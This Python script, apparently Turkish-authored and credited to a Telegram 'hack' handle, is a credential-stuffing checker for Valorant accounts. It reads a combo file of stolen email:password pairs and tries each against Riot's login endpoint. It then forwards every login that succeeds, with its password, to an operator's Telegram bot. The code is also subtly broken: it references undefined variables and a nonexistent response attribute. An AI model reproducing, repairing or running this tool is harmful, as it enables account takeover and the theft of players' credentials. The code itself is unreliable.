import requests
import os
import re
from cfonts import render


from cfonts import render
T = render('{VALORANT}', colors=['white', 'blue'], align='center')
print(f'''\n
  ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓   
     
                      {T}
    ~ Programmer : @T5RVOS / @TARVOSHACK ~
 
  ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛    
''')

TOKEN = input('Token gir aga: ').strip()
CHAT_ID = input('ID gir aga: ').strip()
combo_dosyası = input('Combo dosyasının tam yolunu girin (örn. /path/to/combo.txt): ').strip()

def send_telegram_message(message):
    url = f'https://api.telegram.org/bot{TOKEN}/sendMessage'
    payload = {
        'chat_id': CHAT_ID,
        'text': message
    }
    try:
        response = requests.post(url, data=payload)
        if response.status_code == 200:
            print("Başarılı bir şekilde botuna gönderildi yaram.")
        else:
            print(f"Telegramda hata: {response.text}")
    except Exception as e:
        print(f"Telegram mesaj Gönderemiyorum amk: {e}")


def login(user, password):
    user2 = re.sub('@.*', '', user)
    payload = {
        'RitoID': user2,
        'RitoPass': password,
        'Bölge': 'eu'
    }
    headers = {
    'authority': 'authenticate.riotgames.com',
    'accept': 'application/json',
    'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/json',
    'origin': 'https://authenticate.riotgames.com',
    'referer': 'https://authenticate.riotgames.com/?client_id=prod-xsso-playvalorant&code_challenge=LGC8bCgxtu8BzTIQvuqHbhg3TXwkvBcUSW2UgERMsY8&locale=tr_TR&method=riot_identity&platform=web&redirect_uri=https%3A%2F%2Fauth.riotgames.com%2Fauthorize%3Fclient_id%3Dprod-xsso-playvalorant%26code_challenge%3DLGC8bCgxtu8BzTIQvuqHbhg3TXwkvBcUSW2UgERMsY8%26code_challenge_method%3DS256%26locale%3Dtr_TR%26redirect_uri%3Dhttps%253A%252F%252Fxsso.playvalorant.com%252Fredirect%26response_type%3Dcode%26scope%3Dopenid%2520account%2520email%2520offline_access%26state%3Df62683cdf98ca78a08a2b01693%26uri%3Dhttps%253A%252F%252Fplayvalorant.com%252Ftr-tr%252Fplatform-selection%252F&security_profile=low',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    }
    try:
        response = requests.post('https://authenticate.riotgames.com/api/v1/login', cookies=cookies, headers=headers, json=json_data)
        print(f"API YANITI: {response.txt}")
        
        if 'Kimlik bilgileriniz yanlış olabilir' in response.text or 'None' in response.text:
            return False
        return True
    except Exception as e:
        print(f"API isteği sırasında hata oluştu: {e}")
        return False


def main():
    if not os.path.exists(combo_dosyası):
        print(f"'{combo_dosyası}' dosyası bulunamadı. Lütfen doğru yolu girdiğinizden emin olun!")
        return

    with open(combo_dosyası, 'r', encoding='utf-8') as file:
        for line in file:
            try:
                
                user, password = line.strip().split(':')
                if not re.match(r"[^@]+@[^@]+\.[^@]+", user):
                    print(f"Geçersiz kullanıcı adı formatı: {user}")
                    continue

                
                if login(user, password):
                    message = f'''
𓊆 𝐀𝐂𝐂𝐎𝐔𝐍𝐓 𝐕𝐀𝐋𝐎𝐑𝐀𝐍𝐓 𓊇 𒋨────━𓆩TARVOS𓆪‏━────𒋨
🇹🇷 𝖎𝖘𝖎𝖒: ﴾ {user.split('@')[0]} ﴿
🇹🇷 𝕶𝖚𝖑𝖑𝖆𝖓ı𝖈ı 𝖆𝖉ı: ﴾ {user} ﴿
🇹🇷 𝖘𝖎𝖋𝖗𝖊: ﴾ {password} ﴿
🇹🇷 𝕲𝖒𝖆𝖎𝖑: ﴾ {user}@gmail.com ﴿
𒋨────━𓆩TARVOS𓆪‏━────𒋨
𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌: @T5RVOS / @TARVOSHACK
'''
                    print(f"Başarılı giriş: {user}:{password}")
                    send_telegram_message(message)
                else:
                    print(f"Başarısız giriş: {user}:{password}")
            except ValueError:
                print(f"Hatalı format: {line.strip()} (Geçerli format: kullanıcı:şifre)")
            except Exception as e:
                print(f"Beklenmeyen bir hata oluştu: {e}")


if __name__ == "__main__":
    os.system('clear')
    main()